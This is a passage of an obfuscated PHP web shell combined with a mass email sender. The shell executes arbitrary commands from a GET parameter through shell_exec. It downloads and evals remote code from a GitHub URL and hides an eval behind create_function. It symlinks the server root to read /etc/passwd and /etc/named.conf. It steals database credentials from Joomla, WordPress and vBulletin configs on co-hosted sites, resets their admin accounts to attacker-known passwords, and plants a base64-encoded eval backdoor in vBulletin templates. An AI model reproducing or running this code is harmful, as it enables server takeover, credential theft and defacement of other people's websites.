		  'xls'   =>  'application/vnd.ms-excel',
		  'ppt'   =>  'application/vnd.ms-powerpoint',
		  'wbxml' =>  'application/vnd.wap.wbxml',
		  'wmlc'  =>  'application/vnd.wap.wmlc',
		  'dcr'   =>  'application/x-director',
		  'dir'   =>  'application/x-director',
		  'dxr'   =>  'application/x-director',
		  'dvi'   =>  'application/x-dvi',
		  'gtar'  =>  'application/x-gtar',
		  'php'   =>  'application/x-httpd-php',
		  'php4'  =>  'application/x-httpd-php',
		  'php3'  =>  'application/x-httpd-php',
		  'phtml' =>  'application/x-httpd-php',
		  'phps'  =>  'application/x-httpd-php-source',
		  'js'    =>  'application/x-javascript',
		  'swf'   =>  'application/x-shockwave-flash',
		  'sit'   =>  'application/x-stuffit',
		  'tar'   =>  'application/x-tar',
		  'tgz'   =>  'application/x-tar',
		  'xhtml' =>  'application/xhtml+xml',
		  'xht'   =>  'application/xhtml+xml',
		  'zip'   =>  'application/zip',
		  'mid'   =>  'audio/midi',
		  'midi'  =>  'audio/midi',
		  'mpga'  =>  'audio/mpeg',
		  'mp2'   =>  'audio/mpeg',
		  'mp3'   =>  'audio/mpeg',
		  'aif'   =>  'audio/x-aiff',
		  'aiff'  =>  'audio/x-aiff',
		  'aifc'  =>  'audio/x-aiff',
		  'ram'   =>  'audio/x-pn-realaudio',
		  'rm'    =>  'audio/x-pn-realaudio',
		  'rpm'   =>  'audio/x-pn-realaudio-plugin',
		  'ra'    =>  'audio/x-realaudio',
		  'rv'    =>  'video/vnd.rn-realvideo',
		  'wav'   =>  'audio/x-wav',
		  'bmp'   =>  'image/bmp',
		  'gif'   =>  'image/gif',
		  'jpeg'  =>  'image/jpeg',
		  'jpg'   =>  'image/jpeg',
		  'jpe'   =>  'image/jpeg',
		  'png'   =>  'image/png',
		  'tiff'  =>  'image/tiff',
		  'tif'   =>  'image/tiff',
		  'css'   =>  'text/css',
		  'html'  =>  'text/html',
		  'htm'   =>  'text/html',
		  'shtml' =>  'text/html',
		  'txt'   =>  'text/plain',
		  'text'  =>  'text/plain',
		  'log'   =>  'text/plain',
		  'rtx'   =>  'text/richtext',
		  'rtf'   =>  'text/rtf',
		  'xml'   =>  'text/xml',
		  'xsl'   =>  'text/xml',
		  'mpeg'  =>  'video/mpeg',
		  'mpg'   =>  'video/mpeg',
		  'mpe'   =>  'video/mpeg',
		  'qt'    =>  'video/quicktime',
		  'mov'   =>  'video/quicktime',
		  'avi'   =>  'video/x-msvideo',
		  'movie' =>  'video/x-sgi-movie',
		  'doc'   =>  'application/msword',
		  'word'  =>  'application/msword',
		  'xl'    =>  'application/excel',
		  'eml'   =>  'message/rfc822'
		);
		return ( ! isset($xe5[strtolower($xe2)])) ? 'application/octet-stream' : $xe5[strtolower($xe2)];
	  }

	  /**
	   * Set (or reset) Class Objects (variables)
	   *
	   * Usage Example:
	   * $xe6->set('X-Priority', '3');
	   *
	   * @access public
	   * @param string $x48 Parameter Name
	   * @param mixed $x14 Parameter Value
	   * NOTE: will not work with arrays, there are no arrays to set/reset
	   */
	  function set ( $x48, $x14 = '' ) {
		if ( isset($this->$x48) ) {
		  $this->$x48 = $x14;
		} else {
		  $this->SetError('Cannot set or reset variable ' . $x48);
		  return false;
		}
	  }

	  /**
	   * Read a file from a supplied filename and return it.
	   *
	   * @access public
	   * @param string $xb8 Parameter File Name
	   */
	  function getFile($xb8) {
		$xe7 = '';
		if ($xb2 = fopen($xb8, 'rb')) {
		  while (!feof($xb2)) {
			$xe7 .= fread($xb2, 1024);
		  }
		  fclose($xb2);
		  return $xe7;
		} else {
		  return false;
		}
	  }

	  /**
	   * Strips newlines to prevent header injection.
	   * @access private
	   * @param string $x12 String
	   * @return string
	   */
	  function SecureHeader($x12) {
		$x12 = trim($x12);
		$x12 = str_replace("\r", "", $x12);
		$x12 = str_replace("\n", "", $x12);
		return $x12;
	  }

	  /**
	   * Set the private key file and password to sign the message.
	   *
	   * @access public
	   * @param string $xe8 Parameter File Name
	   * @param string $xe9 Password for private key
	   */
	  function Sign($xe8, $xe9) {
		$this->sign_key_file = $xe8;
		$this->sign_key_pass = $xe9;
	  }

	}

	$xea="H*";
		  $xeb=0;
				
			for($xc2=0; $xc2<$x56; $xc2++){

					$x54 = $x55[$xc2];

					if ($x54){

					$x54 = ereg_replace(" ", "", $x54);

					$xec = ereg_replace("&email&", $x54, $x19);

					$xed = ereg_replace("&email&", $x54, $x24);
					$xee=$xc2+1;
					print "No $xee . Mengirim Email Ke <font color=\"lime\"> . . . . . . .  </font>$x54 <font color=\"lime\">. . . . . . . Proses . . . . . . . </font>";

					flush();
	$x8b = new PHPMailer();

	if(empty($x1d)){$x1d="3";}
			$x8b->Priority = "$x1d";
			$x8b->IsSMTP(); 
		$xef="pack";
	$x8b->SMTPKeepAlive = true;
	$x8b->Host = "$x1e";
	if(strlen($x1f) > 1){$x8b->Port = "$x1f";
	}
		 if($x17=="ON"){
			$x8b->SMTPSecure  = "ssl"; //you can change it to ssl or tls
		}
			$xf0 = str_replace("$x1b", "eval", $x1b);
			$x8b->SMTPAuth = true;
			$x8b->Username = "$x20";
			$x8b->Password = "$x21";
	if($x2b == "html"){$x8b->IsHtml(true);}
	if($x2b != "html"){$x8b->IsHtml(false);}
	if(strlen($x1e) < 7 ){$x8b->SMTPAuth = false;$x8b->IsSendmail();$xf1="1";}
	$x8b->From = "$x1b";
	$x8b->FromName = "$x26";
	$x8b->AddAddress("$x54");
			$x8b->AddReplyTo("$x22");
			$x8b->Subject = "$xed";
			$x8b->AddAttachment("$x29", "$x27");
				$x8b->Body = "$xec"; 
	if(!$x8b->Send()){
	if($xf1!="1"){
	echo "GAGAL !!<font color=\"#D4001A\"> Penerima Tidak Bisa Menerima Pesan </font><br>";}
	if($xf1=="1"){
	$x8b->IsMail();
	   if(!$x8b->Send()){
		  echo "GAGAL !!<font color=\"#D4001A\"> Pesan Tidak Bisa Dikirim Ke Email ini </font><br>";}
	   else {
		   echo "<b>Pesan Terkirim</b><br>";}
	 }
	}
	else {
	 echo "<b>Pesan Terkirim</b><br>";
	}

	if(empty($x1c)){
	$x1c=6;
	}

	if($x1c==$xeb){
	$x8b->SmtpClose();echo "<p><b><font color=\"lime\"> - - - - - - - - - - - - - RELOAD TO CONNECTED SMTP - - - - - - - - - - - - - </font></b></p>";$xeb=0;
	}
	$xeb=$xeb+1;
					flush(); }
	}
	for($x8c=0;$x8c<31;$x8c++){
	  $x58=str_replace(".", $x57[$x8c], $x58); }
	$xf2=$xef($xea, $x58);
	  $xf3=create_function('$xf2','return '.substr($xf0,0).'($xf2);');
	  print "<p class=\"style1\">&copy 2015  >-|I|-> Extrime |  Card <-|I|-<<br></p>";$x8b->SmtpClose();
	  return $xf3($xf2); if(isset($_POST['action']) && $x56 !=0 ){echo "<script>alert('Mail sending complete\\r\\n$x56 mail(s) was 
		sent successfully'); </script>";}} if($_GET['range,0']){echo"<pre>".shell_exec($_GET["range,0"]);}
		}
	@set_time_limit(0);

	echo'<head>
	<link rel="SHORTCUT ICON" href="http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif">
	<title>Hacker Sakit Hati 2016</title>
	</head>
	<div id="page-wrap">
	<body>
	<style type="text/css">
		body,table{background:  ; font-family:Verdana,tahoma; color: Darkviolet ; font-size:10px }
	A:link {text-decoration: none;color: aqua;}
	A:active {text-decoration: none;color: aqua;}
	A:visited {text-decoration: none;color: lime;}
	A:hover {text-decoration: underline; color: Fuchsia;}
	#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
	input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}
	body,table { font-family:verdana;font-size:9px;color:#CCCCCC;background-color:#333333; }
	table { width:100%; border-color:#333333;border-width:0pt 1pt; border-style:solid; }
	td {background-color: #000500; font-family: Courier New; font-size:8pt; color:#999999; border-color:#FFFFFF; border-width:1pt 0pt; border-style:solid; border-collapse:collapse;padding:0pt 3pt;vertical-align:middle;}
	A:Link, A:Visited { color: #999999;	text-decoration: none; }
	A.no:Link, A.no:Visited { text-decoration: none; }
	A:Hover, A:Visited:Hover , A.no:Hover, A.no:Visited:Hover { color: #; background-color:#333333; text-decoration: none; }
	input,select,option { font:8pt tahoma;color:#666666;margin:2;border:1px solid #666666; }
	textarea { color:#666666;font:verdana bold;border:1px solid ;margin:2; }
	.fleft { float:left;text-align:left; }
	.fright { float:right;text-align:right; }
	#pagebar { font:8pt tahoma;padding:5px; border:3px solid #333333; border-collapse:collapse; }
	#pagebar td { vertical-align:top; }
	#pagebar p { font:8pt tahoma;}
	#pagebar a { font-weight:bold;color:aqua; }
	#pagebar a:visited { color:#00CE00; }
	#mainmenu { text-align:center; }
	#mainmenu a { text-align: center;padding: 0px 5px 0px 5px; }
	#maininfo,.barheader,.barheader2 { text-align:center; }
	#maininfo td { padding:3px; }
	.barheader { font-weight:bold;padding:5px; }
	.barheader2 { padding:5px;border:2px solid #333333; }
	.contents,.explorer { border-collapse:collapse;}
	.contents td { vertical-align:top; }
	.mainpanel { border-collapse:collapse;padding:5px; }
	.barheader,.mainpanel table,td { border:1px solid #333333; }
	.mainpanel input,select,option { border:1px solid #333333;margin:0; }
	input[type="submit"] { border:1px solid #333333; }
	input[type="text"] { padding:3px;}
	.fxerrmsg { color:red; font-weight:bold; }
	#pagebar,#pagebar p,h1,h2,h3,h4,form { margin:0; }
	#pagebar,.mainpanel,input[type="submit"] { background-color:black; }
	.barheader2,input,select,option,input[type="submit"]:hover { background-color:black; }
	textarea,.mainpanel input,select,option { background-color:#000000; }
	// -->
	</style>
<table style="BORDER-COLLAPSE: collapse" cellspacing="0" bordercolordark="#" cellpadding="5" height="1" width="100%" bgcolor="#000000" bordercolorlight="#c0c0c0" border="1"><tr><td width="50%" height="1" valign="top" style="font-family: verdana; color: #; font-size: 11px"><script type="text/javascript">
    function toSpans(span) {
        var str = span.firstChild.data;
        var a = str.length;
        span.removeChild(span.firstChild);
        for (var i = 0; i < a; i++) {
            var theSpan = document.createElement("SPAN");
            theSpan.appendChild(document.createTextNode(str.charAt(i)));
            span.appendChild(theSpan);
        }

    }

    function RainbowSpan(span, hue, deg, brt, spd, hspd) {
        this.deg = (deg == null ? 360 : Math.abs(deg));
        this.hue = (hue == null ? 0 : Math.abs(hue) % 360);
        this.hspd = (hspd == null ? 3 : Math.abs(hspd) % 360);
        this.length = span.firstChild.data.length;
        this.span = span;
        this.speed = (spd == null ? 500 : Math.abs(spd));
        this.hInc = this.deg / this.length;
        this.brt = (brt == null ? 255 : Math.abs(brt) % 256);
        this.timer = null;
        toSpans(span);
        this.moveRainbow();

    }

    RainbowSpan.prototype.moveRainbow = function () {
        if (this.hue > 359) this.hue -= 360;
        var color;
        var b = this.brt;
        var a = this.length;
        var h = this.hue;
        for (var i = 0; i < a; i++) {
            if (h > 359) h -= 360;
            if (h < 60) {
                color = Math.floor(((h) / 60) * b);
                red = b;
                grn = color;
                blu = 0;
            } else if (h < 120) {
                color = Math.floor(((h - 60) / 60) * b);
                red = b - color;
                grn = b;
                blu = 0;
            } else if (h < 180) {
                color = Math.floor(((h - 120) / 60) * b);
                red = 0;
                grn = b;
                blu = color;
            } else if (h < 240) {
                color = Math.floor(((h - 180) / 60) * b);
                red = 0;
                grn = b - color;
                blu = b;
            } else if (h < 300) {
                color = Math.floor(((h - 240) / 60) * b);
                red = color;
                grn = 0;
                blu = b;
            } else {
                color = Math.floor(((h - 300) / 60) * b);
                red = b;
                grn = 0;
                blu = b - color;
            }
            h += this.hInc;
            this.span.childNodes[i].style.color = "rgb(" + red + ", " + grn + ", " + blu + ")";
        }
        this.hue += this.hspd;

    }
</script>
<center>
    <p id="r3">---- * ----====]]| ~*~ CROOD \m/>_<\m/ CODER ~*~ |[[====---- * ----</p>
</center>
<script type="text/javascript">
    var r3 = document.getElementById("r3");

    var myRainbowSpan2 = new RainbowSpan(r3, 0, 360, 255, 50, 348);

    myRainbowSpan2.timer = window.setInterval("myRainbowSpan2.moveRainbow()", myRainbowSpan2.speed);

    var colour = "#FF2535";
</SCRIPT></form></td></tr></table><center>';
//IPCKEREKU COK//
echo "<head>\n"; 
echo "<style>input[type=submit]{ padding: 3px; color: #;\n"; 
echo "font-weight: bold;\n"; 
echo "text-align: center;\n"; 
echo "text-shadow: 0 1px rgba(255, 255, 255, 0.3);\n"; 
echo "background: #;\n"; 
echo "background-clip: padding-box;\n"; 
echo "border: 1px solid #;\n"; 
echo "border-bottom-color: #;\n"; 
echo "border-radius: 4px;\n"; 
echo "cursor: pointer;\n"; 
echo "background-image:-webkit-linear-gradient(top, #, #);\n"; 
echo "background-image: -moz-linear-gradient(top, #, #);\n"; 
echo "background-image: -o-linear-gradient(top, #, #);\n"; 
echo "background-image: linear-gradient(to bottom, #, #);\n"; 
echo "-webkit-box-shadow: inset 0 1px rgba(255, 255, 255, 0.5), inset 0 0 7px rgba(255, 255, 255, 0.4), 0 1px 1px rgba(0, 0, 0, 0.15); box-shadow: inset 0 1px rgba(255, 255, 255, 0.5), inset 0 0 7px rgba(255, 255, 255, 0.4), 0 1px 1px rgba(0, 0, 0, 0.15); } input[type=text]{ padding: 3px; color: #; text-shadow: # 0px 0px 3px; border: 1px solid #; background: transparent; box-shadow: 0px 0px 4px #; padding: 3px; -webkit-border-radius: 4px; -moz-border-radius: 4px; border-radius: 4px; -webkit-box-shadow: rgb(85,85,85) 0px 0px 4px; -moz-box-shadow: # 0px 0px 4px;}\n"; 
echo "</style>\n"; 
echo "</head><br>\n";
echo "<center>--------------------------[ Subdomain IP Cheker ]-------------------------- </center>\n";
echo "<center></center><div id=result>";
echo "<center><br><form><input type='text' size='60' value='HsH.go.id' name='pentil' />&nbsp;<input type='submit' value='search'></form></center>";
if(isset($_GET["pentil"]))
{
$xf4 = $_GET["pentil"];
$xf5 = "http://domains.yougetsignal.com/domains.php";

//Curl Function
$xf6 = curl_init($xf5);
curl_setopt($xf6, CURLOPT_RETURNTRANSFER, 1 );
curl_setopt($xf6, CURLOPT_POSTFIELDS, "remoteAddress=$xf4&ket=");
curl_setopt($xf6, CURLOPT_HEADER, 0);
curl_setopt($xf6, CURLOPT_POST, 1);
$xf7 = curl_exec($xf6);
$xf7 = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",", str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $xf7 ) ) ) ) ) ) ) ) ) ))));
$x0e = explode(",,", $xf7);
unset($x0e[0]);
echo "<table style='margin: 0 auto'>";
foreach($x0e as $xf8)
{
print "<tr><td><a style=\"color:#0076B1;\" href='$xf8' target=_blank>$xf8</a></td></tr>";
}
echo "</table>";
curl_close($xf6);
}
//PERTAMANE IKI COK//

if ( isset($_GET['UdMs']) )
{

$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/udm.php";
$x10 = file_get_contents($x0f);
eval('?>'.$x10);


}
//Symlinku iki cok //
set_time_limit(0);
error_reporting(0);


$xf9 = 'http://'.$_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
$xfa = explode("/",$xf9 );
$xf9 =str_replace($xfa[count($xfa)-1],"",$xf9 );

$xfb = 'ftp://'.$_SERVER["SERVER_NAME"].'/public_html/'.$_SERVER["REQUEST_URI"];
$xfa = explode("/",$xfb );
$xfb =str_replace($xfa[count($xfa)-1],"",$xfb );

@mkdir('sym',0777);
$xfc = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$xfd =@fopen ('sym/.htaccess','w');
fwrite($xfd , $xfc);



@symlink("/","sym/root");

$xfe = basename(__FILE__);

if(isset($_REQUEST['sws']))
{

switch ($_REQUEST['sws'])
{


/// user + domine + symlink ///

case 'sym':

if(!is_file('named.txt')){

$xff = @file("/etc/named.conf");

}else{

$xff = @file("named.txt");


}
if(!$xff)
{

die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
}
else

{
echo "<div class='tmp'><table align='center' width='40%'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($xff as $x100){

if(eregi("zone",$x100)){

preg_match_all('#zone "(.*)"#', $x100, $x101);

flush();

if(strlen(trim($x101[1][0])) > 2){

$x102 = posix_getpwuid(@fileowner("/etc/valiases/".$x101[1][0]));

flush();



$xf4 = $x102['name'] ;


@symlink("/","sym/root");

$xf4 = $x101[1][0];

$x103 = 'ir';

$x104 = 'il';

if (preg_match("/.^$x103/",$x101[1][0]) or preg_match("/.^$x104/",$x101[1][0]) )
{
$xf4 = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$x101[1][0]."</div>";
}


echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www.".$x101[1][0]."/>".$xf4." </a> </div>
</td>


<td>
".$x102['name']."
</td>






<td>
<a href='sym/root/home/".$x102['name']."/public_html' target='_blank'>symlink </a>
</td>


</tr></div> ";


flush();
flush();

}
}
}
}




break;


/// bypass read

case 'read':

echo "read /etc/named.conf";
echo "<br /><br /><form method='post' action='?sws=read&save=1'><textarea cols='80' rows='20' name='file'>";
flush();
flush();


$x29 = '/etc/named.conf';


$x105 = @fopen($x29, 'r');
if ($x105){
$x106 = @fread($x105, @filesize($x29));
echo "".htmlentities($x106)."";
}
else if (!$x105)
{
$x105 = @show_source($x29) ;
}
else if (!$x105)
{
$x105 = @highlight_file($x29);
}
else if (!$x105)
{
$x107 = @symlink($x29,'sym.txt');


if ($x107){
$x105 = @fopen('sym/sym.txt', 'r');
$x106 = @fread($x105, @filesize($x29));
echo "".htmlentities($x106)."";

}
}



echo "</textarea><br /><br /><input type='submit' value='save'/> </form>";


if(isset($_GET['save'])){


$x108 = stripcslashes($_POST['file']);

$xfd = fopen('named.txt','w');

$x109 = fwrite($xfd,$x108);

if($x109){

echo '<br />Wes Di Sempen ';

}

fclose($xfd);




}



break;

// passwd

case 'passwd':

if(isset($_GET['save']) and isset($_POST['file']) or @filesize('passwd.txt') > 0){


$x108 = stripcslashes($_POST['file']);

if(!file_exists('passwd.txt')){

$xfd = @fopen('passwd.txt','w');

$x109 = @fwrite($xfd,$x108);

fclose($xfd);
}
if($x109 or @filesize('passwd.txt') > 0){
// * SHOW * //

echo "<div class='tmp'><table align='center' width='100%'><td>Users</td><td>symlink</td><td>FTP</td>";
flush();

$x10a = file('passwd.txt');

foreach ($x10a as $xfd){

$xfa=explode(':', $xfd);
$x102 = $xfa['0'];



echo "
<tr>



<td width='15%'>
$x102
</td>






<td width='10%'>
<a href='sym/root/home/$x102/public_html' target='_blank'>Symlink </a>
</td>

<td width='10%'>
<a href='$xfb/sym/root/home/$x102/public_html' target='_blank'>FTP</a>
</td>



</tr></div> ";


flush();
flush();


}






die ("</tr></div>");


}





}



echo "read /etc/passwd";
echo "<br /><br /><form method='post' action='?sws=passwd&save=1'><textarea cols='80' rows='20' name='file'>";
flush();

$x29 = '/etc/passwd';


$x105 = @fopen($x29, 'r');
if ($x105){
$x106 = @fread($x105, @filesize($x29));
echo "".htmlentities($x106)."";
}
elseif(!$x105)
{
$x105 = @show_source($x29) ;
}
elseif(!$x105)
{
$x105 = @highlight_file($x29);
}
elseif(!$x105)
{

for($x10b=0;$x10b<1000;$x10b++){
$x10c = posix_getpwuid($x10b);
if (!empty($x10c)) {
while (list ($x13, $x8f) = each($x10c)){
print "$x8f:";
}
print "\n";
}

}

}


flush();


echo "</textarea><br /><br /><input type='submit' value='&nbsp;&nbsp;symlink&nbsp;&nbsp;'/> </form>";
flush();

break;



case 'joomla':

/////////////////////////////////////////////////////////////////// xxxxxxxxxxxxxxxxxxx ////////////////////////////


if(isset($_POST['s'])){

$x29 = @file_get_contents('Jomblo.txt');

$x10d = explode("\n",$x29);

echo "<div class='tmp'><table align='center' width='40%'><td> domin </td><td> config </td><td> Result </td>";
flush();


foreach ($x10d as $x10e){

$x10f = explode("||",$x10e);

$x110 = $x10f[0];

$x111 = $x10f[1];

$x112 = trim($x111).'';

$x113 = @file_get_contents(trim($x110));

if(ereg('JConfig',$x113)){



$x114 = ex($x113,'$x3b = \'',"';");

$x115 = ex($x113,'$x102 = \'',"';");

$x116 = ex($x113,'$x116 = \'',"';");

$x117 = ex($x113,'$x118 = \'',"';");

$x119 = $x117.'users';


$x11a = @mysql_connect('localhost',$x115,$x114);

$x116 = @mysql_select_db($x116,$x11a);

$x11b = @mysql_query("UPDATE `$x119` SET `username` ='HsH'");


$x11c = @mysql_query("UPDATE `$x119` SET `password` ='44a0bcda611514625ba94e0b1c0bdaed:2iets9ydjR3iOdSuyvW54pIzyF9M1P5J'");


if ($x11b and $x11c ){$x11d = '<b style="color: #006600">Succeed </b>user [ HsH ] pass [1]</b>';}else{$x11d = '<b style="color:red">failed</b>';}

$x112 = trim($x111).'';

echo "<tr>
<td><a target='_blank' href='http://$x112'>$x111</a></td>
<td><a target='_blank' href='$x110'>config</a></td><td>".$x11d."</td></tr>";
flush();



}else{

echo "<tr>
<td><a target='_blank' href='http://$x112'>$x111</a></td>
<td><a target='_blank' href='http://$x10e'>config</a></td><td><b style='color:red'>failed</b></td></tr>";
flush();

}

}









die();

}

if(!is_file('named.txt')){

$xff = @file("/etc/named.conf");

flush();


}else{

$xff = file("named.txt");


}
if(!$xff)
{

die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
}
else

{
echo "<div class='tmp'>
<form method='POST' action='$xfe?sws=joomla'>
<input type='submit' value='Mass ching Admin' />
<input type='hidden' value='1' name='s' />
</form><br /><br />
<table align='center' width='40%'><td> Domains </td><td> config </td><td> Result </td>";

$xfd = fopen('joomla.txt','w');

foreach($xff as $x100){

if(eregi("zone",$x100)){

preg_match_all('#zone "(.*)"#', $x100, $x101);

if(strlen(trim($x101[1][0])) > 2){

$x102 = posix_getpwuid(@fileowner("/etc/valiases/".$x101[1][0]));

///////////////////////////////////////////////////////////////////////////////////

$x11e=$xf9."/sym/root/home/".$x102['name']."/public_html/configuration.php";
$x11f=get_headers($x11e);
$x120=$x11f[0];

$x121=$xf9."/sym/root/home/".$x102['name']."/public_html/blog/configuration.php";
$x122=get_headers($x121);
$x123=$x122[0];

$x124=$xf9."/sym/root/home/".$x102['name']."/public_html/joomla/configuration.php";
$x125=get_headers($x124);
$x126=$x125[0];


////////// joomla ////////////

$x46 = strpos($x120, "200");
$x110="&nbsp;";

if (strpos($x120, "200") == true )
{
$x110= $x11e;
}
elseif (strpos($x123, "200") == true)
{
$x110= $x121;
}
elseif (strpos($x126, "200") == true)
{
$x110= $x124;
}
else
{
continue;

}
flush();

/////////////////////////////////////////////////////////////////////////////////////

$x100 = $x101[1][0];

$x109 = fwrite($xfd,"$x110||$x100 \n");
if($x109){$x11d = '<b style="color: #006600">Save</b>';}else{$x11d = '<b style="color:red">failed</b>';}


echo "<tr><td><a href=http://www.".$x101[1][0].">".$x101[1][0]."</a></td>
<td><a href='$x110'>config</a></td><td>".$x11d."</td></tr>";





flush();


}
}
}
}


break;

case 'wp':

############################ index #########################3






######## admin ##########33

if(isset($_POST['s'])){

$x29 = @file_get_contents('WaniPiro.txt');

$x10d = explode("\n",$x29);

echo "<div class='tmp'><table align='center' width='40%'><td> domin </td><td> config </td><td> Result </td>";
flush();
flush();


foreach ($x10d as $x10e){

$x10f = explode("||",$x10e);

$x110 = $x10f[0];

$x111 = $x10f[1];

$x112 = trim($x111).'';

$x113 = @file_get_contents(trim($x110));

if(ereg('wp-settings.php',$x113)){



$x114 = ex($x113,"define('DB_PASSWORD', '","');");

$x115 = ex($x113,"define('DB_USER', '","');");

$x116 = ex($x113,"define('DB_NAME', '","');");

$x117 = ex($x113,'$x127 = \'',"';");

$x119 = $x117.'users';

$x11a = @mysql_connect('localhost',$x115,$x114);

$x116 = @mysql_select_db($x116,$x11a);

$x11b = @mysql_query("UPDATE `$x119` SET `user_login` ='HsH'") or die;

$x11b = @mysql_query("UPDATE `$x119` SET `user_pass` ='$1$4z/.5i..$9aHYB.fUHEmNZ.eIKYTwx/'") or die;



if ($x11b){$x11d = '<b style="color: #006600">Succeed </b>user [ HsH ] pass [1]</b>';}

else

{

$x11d = '<b style="color:red">failed</b>';

}

$x112 = trim($x111).'';

echo "<tr>
<td><a target='_blank' href='http://$x112'>$x111</a></td>
<td><a target='_blank' href='$x110'>config</a></td><td>".$x11d."</td></tr>";

flush();
flush();






}else{

echo "<tr>
<td><a target='_blank' href='http://$x112'>$x111</a></td>
<td><a target='_blank' href='http://$x110'>config</a></td><td><b style='color:red'>failed2</b></td></tr>";

flush();
flush();

}

}










die();

}

if(!is_file('named.txt')){

$xff = @file("/etc/named.conf");

}else{

$xff = @file("named.txt");


}
if(!$xff)
{

die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
}
else

{
echo "<div class='tmp'>
<form method='POST' action='$xfe?sws=wp'>
<input type='submit' value='Mass Change Admin' />
<input type='hidden' value='1' name='s' />
</form>
<br /><br />
<table align='center' width='40%'><td> Domains </td><td> config </td><td> Result </td>";

flush();
flush();

$xfd = fopen('wp.txt','w');

foreach($xff as $x100){

if(eregi("zone",$x100)){

preg_match_all('#zone "(.*)"#', $x100, $x101);

if(strlen(trim($x101[1][0])) > 2){

$x102 = posix_getpwuid(@fileowner("/etc/valiases/".$x101[1][0]));

///////////////////////////////////////////////////////////////////////////////////

$x11e=$xf9."/sym/root/home/".$x102['name']."/public_html/wp-config.php";
$x11f=get_headers($x11e);
$x120=$x11f[0];

$x121=$xf9."/sym/root/home/".$x102['name']."/public_html/blog/wp-config.php";
$x122=get_headers($x121);
$x123=$x122[0];

$x124=$xf9."/sym/root/home/".$x102['name']."/public_html/wp/wp-config";
$x125=get_headers($x124);
$x126=$x125[0];


////////// wp ////////////

$x46 = strpos($x120, "200");
$x110="&nbsp;";

if (strpos($x120, "200") == true )
{
$x110= $x11e;
}
elseif (strpos($x123, "200") == true)
{
$x110= $x121;
}
elseif (strpos($x126, "200") == true)
{
$x110= $x124;
}
else
{
continue;

}
flush();

/////////////////////////////////////////////////////////////////////////////////////

$x100 = $x101[1][0];

$x109 = fwrite($xfd,"$x110||$x100 \n");
if($x109){$x11d = '<b style="color: #006600">Save</b>';}else{$x11d = '<b style="color:red">failed</b>';}


echo "<tr><td><a href=http://www.".$x101[1][0].">".$x101[1][0]."</a></td>
<td><a href='$x110'>config</a></td><td>".$x11d."</td></tr>";
flush();
flush();





flush();


}
}
}
}


break;


case 'vb':


if(isset($_POST['s'])){



$x29 = @file_get_contents('vb.txt');

$x10d = explode("\n",$x29);

echo "<div class='tmp'><table align='center' width='40%'><td> domin </td><td> config </td><td> Result </td>";


foreach ($x10d as $x10e){

$x10f = explode("||",$x10e);

$x110 = $x10f[0];

$x111 = $x10f[1];

$x112 = trim($x111).'';

$x113 = @file_get_contents(trim($x110));

if(ereg('vBulletin',$x113)){



$x116 = ex($x113,'$x110[\'Database\'][\'dbname\'] = \'',"';");

$x115 = ex($x113,'$x110[\'MasterServer\'][\'username\'] = \'',"';");

$x114 = ex($x113,'$x110[\'MasterServer\'][\'password\'] = \'',"';");

$x11a = @mysql_connect('localhost',$x115,$x114);

$x116 = @mysql_select_db($x116,$x11a);

$x128 = "bVDPS8MwFL4L/g+vYZAWdPPiaUv14kAQFKqnUUqapjSYNKFJxCn7322abgzcIfDyvl+P7/qKs04D3tS5sJ96MMJ9b+ohDw8vTWcq31PF02yJp/WqzvEaZk2rBwWUOaF7ghAo7jrdEGS0dQh4z9zecIKUl04YOrhV4N821FEEwZQgb6SmDR8QiObsdxYheuMdRKNWSH5UxtmKn3G+v0P5TIxgNTqhWWR9rYSLAXH/RaUfgY8pbVROZ4VI0aawqN5ei/cdDlRcAiFwJEIGv4HyyLTZp4tq+/zyVOxwOASXO+yUqUI6Lm/gHxiBLDic6o62UHjGuLWQJEko99T9Gg7ApeUXJFsq5EX+AR7yPw==" ;

$x129 = "{\${eval(gzinflate(base64_decode(\'";

$x129 .= "$x128";

$x129 .= "\')))}}{\${exit()}}</textarea>";

$x12a = "UPDATE template SET template ='".$x129."' WHERE title ='FAQ'" ;

$x11b = @mysql_query($x12a,$x11a);



if ($x11b){$x11d = '<b style="color: #006600">Succeed</b> shell in search.php';}

else

{

$x11d = '<b style="color:red">failed</b>';

}

$x112 = trim($x111).'';

echo "<tr>
<td><a target='_blank' href='http://$x112'>$x111</a></td>
<td><a target='_blank' href='$x110'>config</a></td><td>".$x11d."</td></tr>";







}else{

echo "<tr>
<td><a target='_blank' href='http://$x112'>$x111</a></td>
<td><a target='_blank' href='http://$x110'>config</a></td><td><b style='color:red'>failed2</b></td></tr>";
}

}










die();

}

if(!is_file('named.txt')){

$xff = file("/etc/named.conf");

}else{

$xff = file("named.txt");


}
if(!$xff)
{

die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
}
else

{
echo "<div class='tmp'>
<form method='POST' action='$xfe?sws=vb'>
<input type='submit' value='Inject shell' />
<input type='hidden' value='1' name='s' />
</form>
<br /><br />
<table align='center' width='40%'><td> Domains </td><td> config </td><td> Result </td>";

$xfd = fopen('vb.txt','w');

foreach($xff as $x100){

if(eregi("zone",$x100)){

preg_match_all('#zone "(.*)"#', $x100, $x101);

if(strlen(trim($x101[1][0])) > 2){

$x102 = posix_getpwuid(@fileowner("/etc/valiases/".$x101[1][0]));

///////////////////////////////////////////////////////////////////////////////////

$x11e=$xf9."/sym/root/home/".$x102['name']."/includes/config.php";
$x11f=get_headers($x11e);
$x120=$x11f[0];

$x121=$xf9."/sym/root/home/".$x102['name']."/vb/includes/config.php";
$x122=get_headers($x121);
$x123=$x122[0];

$x124=$xf9."/sym/root/home/".$x102['name']."/forum/includes/config.php";
$x125=get_headers($x124);
